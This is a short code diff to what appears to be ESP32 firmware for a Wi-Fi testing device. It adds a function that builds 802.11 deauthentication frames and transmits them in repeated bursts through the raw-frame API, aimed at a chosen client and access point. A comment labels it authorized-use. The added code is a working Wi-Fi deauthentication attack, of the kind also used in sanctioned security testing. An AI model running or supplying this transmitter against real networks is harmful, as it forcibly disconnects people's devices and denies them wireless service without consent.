@@ -25,3 +25,20 @@ void deauth_begin() {
 
 bool     deauth_active() { return s_on; }
 uint32_t deauth_count()  { return s_count; }
+
+// Authorized-use deauth transmit. Frame is built by the host-tested deauth_frame();
+// esp_wifi_80211_tx pushes raw mgmt frames. Bring-up: needs promiscuous/AP iface
+// active and a target on the current channel — see docs/BRINGUP.md (WiFi deauth).
+bool wifi_deauth_tx(const uint8_t dst[6], const uint8_t bssid[6],
+                    uint16_t reason, int bursts) {
+  if (!s_on) deauth_begin();                  // promiscuous iface is enough to TX
+  uint8_t frame[DEAUTH_FRAME_LEN];
+  deauth_frame(dst, bssid, reason, frame);
+  bool ok = true;
+  for (int i = 0; i < bursts; i++) {
+    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof frame, false) != ESP_OK)
+      ok = false;
+    delay(1);
+  }
+  return ok;
+}
